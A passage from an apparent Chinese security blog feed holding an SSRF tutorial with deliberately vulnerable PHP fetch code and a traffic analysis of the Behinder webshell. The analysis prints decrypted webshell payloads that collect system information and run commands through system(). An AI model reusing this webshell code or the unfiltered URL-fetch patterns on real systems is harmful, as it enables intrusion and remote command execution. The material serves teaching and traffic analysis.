    <content type="html"><![CDATA[<h6 id="ssrf-服务器请求伪造"><a href="#ssrf-服务器请求伪造" class="headerlink" title="ssrf(服务器请求伪造)"></a>ssrf(服务器请求伪造)</h6><p>一般现在的公司部署网站时,不会显示真实的网站ip,而是具有边界cdn或者边界内容分发点.ssrf可以通过这个边界内容分发点进行内网资源的探测(远比nmap好使,nmap一扫描,如果是边界点的话不是全部开发就是全部关闭之类的)</p><p>或者是一个web服务器可以访问其他内网的资源.</p><p>ssrf:服务器请求伪造是一种攻击者构造形成由服务器发起请求的一个安全漏洞.一般情况下,我们是访问不到内部系统,但是ssrf攻击的目标从外网访问原来无法访问的内网</p><p>为什么会产生ssrf?<br>很多Web应用都提供了从其他服务器上获取数据的功能。使用用<br>户指定的URL，Web应用可以获取图片，下载文件，读取文件内容等。<br>这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击<br>远程和本地服务器。<br>服务端提供了从其他服务器应用获取数据的功能且没有对目标地<br>址做过滤与限制.</p><p>大部分的web服务器架构中，web服务器自身都可以访问互联网和服务器所在的内网。</p><p><img src="/2021/07/25/ssrf/image-20221026211834785.png"></p><p>SSRF能做的事情</p><p>1.可以对外网服务器所在的内网、本地进行端口扫描，获取-些服务的banner信息a<br>2.攻击运行在内网或者本地的应用程序。<br>3.对内网web应用进行指纹识别，通过访问默认文件实现。<br>4.攻击内外网的web应用。sql注入、struct2、redis等。利用file协议读取本地文件等。</p><p>造成ssrf的常用函数</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">file<span class="hljs-emphasis">_get_contents 读取文件内容,但是不会执行php代码,文件远程包含也有用到</span><br><span class="hljs-emphasis">fsockopen 开一个套接字去连接一个东西</span><br><span class="hljs-emphasis">curl_</span>exec 打开页面,执行命令<br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123; <br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]); <br><span class="hljs-variable">$filename</span> =<span class="hljs-string">&#x27;img1.jpg’;</span><br><span class="hljs-string"> file_put_contents($filename, $content); </span><br><span class="hljs-string">echo $_POST[&#x27;</span>url’]; <br><span class="hljs-variable">$img</span> = <span class="hljs-string">&quot;&lt; img src=\&quot;&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot;\&quot;/&gt;&quot;</span>; <br>&#125; <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$img</span>; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/07/25/ssrf/image-20221026212121412.png"></p><p><img src="/2021/07/25/ssrf/image-20221026212233477.png"></p><p><img src="/2021/07/25/ssrf/image-20221026212301700.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$link</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//fsockopen() 将返回一个文件句柄，之后可以被其他文件类函数调用</span><br>    <span class="hljs-comment">//（例如： fgets() ， fgetss() ，</span><br>    <span class="hljs-comment">// fwrite() ， fclose() 还有 feof() ）。如果调用失败，将返回 FALSE 。</span><br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>); <span class="hljs-comment">//这个函数相当于`我们之前python写的nmap扫描器的socket,为了连接资源</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>;<br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>;<br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>;<br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>;<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>);<br>        <span class="hljs-variable">$contents</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">while</span> (! <span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123;<br>        <span class="hljs-comment">//feof以字符串显示资源</span><br>            <span class="hljs-variable">$contents</span> .= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$host</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-variable">$port</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;port&#x27;</span>];<br><span class="hljs-variable">$link</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;link&#x27;</span>];<br></code></pre></td></tr></table></figure><p><img src="/2021/07/25/ssrf/image-20221026212346252.png"></p><p><img src="/2021/07/25/ssrf/image-20221026212427479.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">xxxxxxxxxx <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<span class="hljs-comment">//是否参入相应的参数$link = $_POST[&#x27;url’];$curlobj = curl_init();//初始化(类似于初始化开启一个资源)curl_setopt($curlobj, CURLOPT_POST, 0);//利用开启的资源来发送数据包,并表明用什么方式发送curl_setopt($curlobj,CURLOPT_URL,$link);curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);//以字符串的方式打印出来$result=curl_exec($curlobj);执行最后配置好的资源(也类似于socket(python))curl_close($curlobj);关闭资源$filename = &#x27;./&#x27;.rand().&#x27;.txt’;file_put_contents($filename, $result); echo $result;&#125;?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/07/25/ssrf/image-20221026212533866.png"></p><p>ssrf漏洞查找</p><p>由原理可以看出，SSRF是由于服务端获取其他服务器的相关信息的功能中形成的，因此我们大可以列举几种在web 应用中常见的从服务端获取其他服务器信息的的功能。<br>而我们一般正常去访问页面,是不是页面上会有很多的图片,一般来说,这些图片是不是我浏览器去请求的</p>]]></content>
    
    
    <categories>
      
      <category>外网知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>冰蝎命令执行分析</title>
    <link href="/2021/07/02/%E5%86%B0%E8%9D%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/"/>
    <url>/2021/07/02/%E5%86%B0%E8%9D%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>php:&#x2F;&#x2F;input 可以读取没有处理过的POST数据。</p><p><img src="/2021/07/02/%E5%86%B0%E8%9D%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%871.png"></p><p>在互相发送数据包之前,客户端和服务端必然已经验证对方的身份了(无法解码的那个包因该就是验证身份那个包)</p><p><img src="/2021/07/02/%E5%86%B0%E8%9D%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%872.png"></p><p>进行解码</p><p><img src="/2021/07/02/%E5%86%B0%E8%9D%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%873.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs php">@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"><span class="hljs-variable">$content</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$result</span>[<span class="hljs-string">&quot;status&quot;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&quot;success&quot;</span>);<br>    <span class="hljs-variable">$result</span>[<span class="hljs-string">&quot;msg&quot;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$content</span>);<br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">encrypt</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$result</span>),<span class="hljs-variable">$key</span>);<span class="hljs-comment">//3.调用加密函数</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<span class="hljs-comment">//4.判断是否加载 openssl库扩展,如果加载了就直接使用这个扩展进行加密操作,否则手动异或运算</span><br>    &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>);<span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">openssl_encrypt</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>    &#125;<br>&#125;<span class="hljs-variable">$content</span>=<span class="hljs-string">&quot;d3c1a0E3dHBWaDhhSEJ5TG1OQnFxdGl1a3VMZlNZajRBaERkeGtsV1VkSllVMGlDdE5LNDM4RGsxRnZQOVF6M2p6cGNJY1NCanVyVDZOeFpWZlhqbXpJSElEQnQyem1qdkdBZFNXc1lPNHVsM2hKQXpBR2RSSDN4OVFxNWp6YWR6blNHYUVLZlpGbURWeExvcFdNU3E5ZFBWWFdsbGRTOW92bnNTZGM1QkRicU9lSW1UU1pjc0VlWVQwQ1EyZWxvREdYY3htelVrV2t4Q1VJYTQ1MWg=&quot;</span>;<br><span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$content</span>);<span class="hljs-comment">//1.先进行base64解码</span><br><span class="hljs-title function_ invoke__">main</span>(<span class="hljs-variable">$content</span>);<span class="hljs-number">2</span>.解码后调用main函数<br><br><br>第三个数据包<br>zm뇞r^<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"><span class="hljs-variable">$whatever</span></span>) </span>&#123;<br><span class="hljs-title function_ invoke__">ob_start</span>();<span class="hljs-comment">//开一个缓存</span><br> <span class="hljs-title function_ invoke__">phpinfo</span>(); <br><span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>(); 读取缓存的东西<br><span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>    <span class="hljs-variable">$driveList</span> =<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS,<span class="hljs-string">&quot;windows&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS,<span class="hljs-string">&quot;winnt&quot;</span>))panduanshilinux还是windows系统<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">65</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">90</span>;<span class="hljs-variable">$i</span>++)<span class="hljs-comment">//判断有几个盘符</span><br>    &#123;<br>    <span class="hljs-variable">$drive</span>=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>).<span class="hljs-string">&#x27;:/&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$drive</span>) ? <span class="hljs-variable">$driveList</span>=<span class="hljs-variable">$driveList</span>.<span class="hljs-variable">$drive</span>.<span class="hljs-string">&quot;;&quot;</span>:<span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;<br>    &#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$driveList</span>=<span class="hljs-string">&quot;/&quot;</span>;<br>&#125;<br>    <span class="hljs-variable">$currentPath</span>=<span class="hljs-title function_ invoke__">getcwd</span>();<span class="hljs-comment">//返回当前路径</span><br>    <span class="hljs-comment">//echo &quot;phpinfo=&quot;.$info.&quot;\n&quot;.&quot;currentPath=&quot;.$currentPath.&quot;\n&quot;.&quot;driveList=&quot;.$driveList;</span><br>    <span class="hljs-variable">$osInfo</span>=PHP_OS;<br>    <span class="hljs-variable">$arch</span>=<span class="hljs-string">&quot;64&quot;</span>;<br>    <span class="hljs-keyword">if</span> (PHP_INT_SIZE == <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-variable">$arch</span> = <span class="hljs-string">&quot;32&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$result</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;basicInfo&quot;</span>=&gt;<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$info</span>),<span class="hljs-string">&quot;driveList&quot;</span>=&gt;<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$driveList</span>),<span class="hljs-string">&quot;currentPath&quot;</span>=&gt;<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$currentPath</span>),<span class="hljs-string">&quot;osInfo&quot;</span>=&gt;<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$osInfo</span>),<span class="hljs-string">&quot;arch&quot;</span>=&gt;<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$arch</span>));<span class="hljs-comment">//这些数据都是返回给客户端的</span><br>    <span class="hljs-comment">//echo json_encode($result);</span><br>    <span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-variable">$key</span>=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>];<br>    <span class="hljs-comment">//echo json_encode($result);</span><br>    <span class="hljs-comment">//echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key);</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">encrypt</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$result</span>), <span class="hljs-variable">$key</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>    &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>);<span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">openssl_encrypt</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>    &#125;<br>&#125;<span class="hljs-variable">$whatever</span>=<span class="hljs-string">&quot;Nk1IQ1Nmb1Fsek96c1NVQ0JiVUw1RlkweVN5eVJvZFVoSm1Za0ROdUdDazVnMTc2YVRBWXh3amd4Y2J2dG9QR0xvdkhQYUhreTVwczhtNjdLWDZGd2dBVGZ3QlpuUG84emJJcVZxeW9kNTZkdzc0WTVRbHpqc0JIM2gwdFBkRzJVVmJnWmg1azh2RWpzdDhMcVVCbjVBUUpyQkRXRUV4R0d2elR5cEV6M0p0Y3JRSUtaVzBnaWhhZncxY2hkZW1vQVBab2JBRnZuY2ZUaEdvdTJUZnhkSElIVUlWUnAzSXNGa1E4SjNIYXNrVExpdmRkUDRvNjREMmkyRHo4ZEZybHZUc01yODI5NWRJcVF4UnBwNlVXaTFma0NvVmNTQVpxUGRKdW9NSGlhTXMzRXBmc1FsR0VmWVJ2VTZrR2ZQZlhCalBHRjZISnRheFRFbkpCQnd3SVFmaVNPeVl4RXl1RkRZcGhQYnJIdW5objJYVkdqY3BZaWYzblUxVFdsWjBCS2FhM3M2d3N2SlloZE1jeENRcFBhcU55bVNIcW5kTmdxZVh1emRoY01pa2hpVkJac0piREhyVXpHWWlIeXJEbVUyNzhrekE2QlRJNXF3Q3d0ajVPR2c0eG9XY2FtTERSS2F1NEkwNzY0Zm53R1NmQUpuaWFndmVYQTJJUTBRY25jMHFOYkFqYWZlMmVQSFZ4QVNaUHN3eXdmZFFaVTA=&quot;</span>;<br><span class="hljs-variable">$whatever</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$whatever</span>);<br><span class="hljs-title function_ invoke__">main</span>(<span class="hljs-variable">$whatever</span>);<br></code></pre></td></tr></table></figure><p><img src="/2021/07/02/%E5%86%B0%E8%9D%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%874.png"></p><p>命令执行数据包分析</p><p><img src="/2021/07/02/%E5%86%B0%E8%9D%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%875.png"></p><p><img src="/2021/07/02/%E5%86%B0%E8%9D%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%876.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs php">zm뇞r^@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getSafeStr</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$s1</span> = <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>,<span class="hljs-string">&#x27;gbk//IGNORE&#x27;</span>,<span class="hljs-variable">$str</span>);<br>    <span class="hljs-variable">$s0</span> = <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&#x27;gbk&#x27;</span>,<span class="hljs-string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="hljs-variable">$s1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s0</span> == <span class="hljs-variable">$str</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$s0</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&#x27;gbk&#x27;</span>,<span class="hljs-string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="hljs-variable">$str</span>);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span>,<span class="hljs-variable">$path</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    @<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    @<span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br>    @<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;max_execution_time&#x27;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$result</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-variable">$PadtJn</span> = @<span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;disable_functions&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$PadtJn</span>)) &#123;<br>        <span class="hljs-variable">$PadtJn</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[, ]+/&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$PadtJn</span>);<br>        <span class="hljs-variable">$PadtJn</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$PadtJn</span>);<br>        <span class="hljs-variable">$PadtJn</span> = <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&#x27;trim&#x27;</span>, <span class="hljs-variable">$PadtJn</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$PadtJn</span> = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">FALSE</span> !== <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-title function_ invoke__">strtolower</span>(PHP_OS), <span class="hljs-string">&#x27;win&#x27;</span>)) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$c</span> . <span class="hljs-string">&quot; 2&gt;&amp;1\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$JueQDBH</span> = <span class="hljs-string">&#x27;is_callable&#x27;</span>;<br>    <span class="hljs-variable">$Bvce</span> = <span class="hljs-string">&#x27;in_array&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$JueQDBH</span>(<span class="hljs-string">&#x27;system&#x27;</span>) <span class="hljs-keyword">and</span> ! <span class="hljs-variable">$Bvce</span>(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-variable">$PadtJn</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">ob_start</span>();<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$kWJW</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>        <span class="hljs-title function_ 